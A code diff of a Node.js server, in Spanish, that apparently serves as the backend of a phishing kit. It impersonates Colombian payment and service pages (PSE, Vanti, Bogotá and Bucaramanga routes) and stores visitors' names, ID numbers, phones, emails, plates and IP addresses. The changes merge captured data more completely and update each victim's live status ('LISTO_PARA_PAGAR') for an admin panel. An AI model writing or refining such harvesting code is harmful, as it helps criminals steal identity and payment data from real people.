@@ -303,7 +303,6 @@ const server = http.createServer(async (req, res) => {
                     const registros = historial.filter(h => h.datos && h.datos.sessionId === sid);
                     let datos = {};
                     if (registros.length > 0) { datos = registros[0].datos; } else { datos = datosSesiones.get(sid) || {}; }
-                    // Mezclar con los datos en memoria por si son más recientes (PSE recién llenado)
                     const memoria = datosSesiones.get(sid) || {};
                     datos = Object.assign({}, datos, memoria);
                     const paso = pasosSesiones.get(sid) || 'index';
@@ -401,6 +400,10 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // ============================================================
+        // 🔥 FIX: Guardar datos del formulario en tiempo real
+        // Actualiza pasosSesiones y ultimaAccionSesiones para que el admin lo muestre
+        // ============================================================
         const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
         if (req.method === 'POST' && consultaMatch) {
             try {
@@ -408,18 +411,56 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, datosPersonales, placasData } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
-                const datosPrevios = sesionesTemporales[sessionId] || {};
-                const datosCompletos = Object.assign({}, datosPrevios, { 
-                    sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, 
-                    datosPersonales: datosPersonales || datosPrevios.datosPersonales || {},
-                    placasData: placasData || datosPrevios.placasData || [],
-                    ip: ip, creadoEn: new Date().toISOString() 
+
+                const datosPrevios = Object.assign(
+                    {},
+                    sesionesTemporales[sessionId] || {},
+                    datosSesiones.get(sessionId) || {}
+                );
+
+                const datosCompletos = Object.assign({}, datosPrevios, {
+                    sessionId,
+                    bancoKey,
+                    ip,
+                    creadoEn: datosPrevios.creadoEn || new Date().toISOString()
                 });
+
+                if (tipoPersona !== undefined) datosCompletos.tipoPersona = tipoPersona;
+                if (tipoDoc !== undefined)     datosCompletos.tipoDoc = tipoDoc;
+                if (documento !== undefined)   datosCompletos.documento = documento;
+                if (nombres !== undefined)     datosCompletos.nombres = nombres;
+                if (apellidos !== undefined)   datosCompletos.apellidos = apellidos;
+                if (telefono !== undefined)    datosCompletos.telefono = telefono;
+                if (correo !== undefined)      datosCompletos.correo = correo;
+                if (tipoPago !== undefined)    datosCompletos.tipoPago = tipoPago;
+                if (placa !== undefined)       datosCompletos.placa = placa;
+                if (precio !== undefined)      datosCompletos.precio = precio;
+                if (datosPersonales !== undefined) datosCompletos.datosPersonales = datosPersonales;
+                if (placasData !== undefined)      datosCompletos.placasData = placasData;
+
                 sesionesTemporales[sessionId] = datosCompletos;
                 guardarSesionesTemporales();
                 datosSesiones.set(sessionId, datosCompletos);
+
                 if (!estadoSesiones.has(sessionId)) estadoSesiones.set(sessionId, 'pendiente');
-                json(res, 200, { ok: true });
+
+                // 🔥 FIX: Actualizar el paso y la última acción para que el admin lo muestre
+                const tienePersonales = datosCompletos.datosPersonales && datosCompletos.datosPersonales.primerNombre;
+                const tienePlacas = Array.isArray(datosCompletos.placasData) && datosCompletos.placasData.length > 0;
+
+                if (tienePlacas) {
+                    pasosSesiones.set(sessionId, 'formulario_completo');
+                    ultimaAccionSesiones.set(sessionId, 'LISTO_PARA_PAGAR');
+                } else if (tienePersonales) {
+                    pasosSesiones.set(sessionId, 'datos_personales');
+                    ultimaAccionSesiones.set(sessionId, 'LLENANDO_DATOS');
+                } else {
+                    pasosSesiones.set(sessionId, 'formulario_pyp');
+                    ultimaAccionSesiones.set(sessionId, 'FORMULARIO');
+                }
+
+                console.log(`[${bancoKey}] guardar-consulta → ${sessionId} | paso: ${pasosSesiones.get(sessionId)}`);
+                json(res, 200, { ok: true, paso: pasosSesiones.get(sessionId) });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
@@ -596,9 +637,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // ============================================================
-        // 🔥 NUEVO: Guardar datos del formulario PSE (nombre, cédula, etc.)
-        // ============================================================
         if (req.method === 'POST' && url === '/vanti/guardar-pse') {
             try {
                 const datos = await getBody(req);
@@ -625,7 +663,6 @@ const server = http.createServer(async (req, res) => {
 
                 datosSesiones.set(sessionId, datosCompletos);
 
-                // Actualizar el historial existente o crear uno nuevo
                 const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
                 if (idx !== -1) {
                     historial[idx].datos = Object.assign({}, historial[idx].datos, datosCompletos);
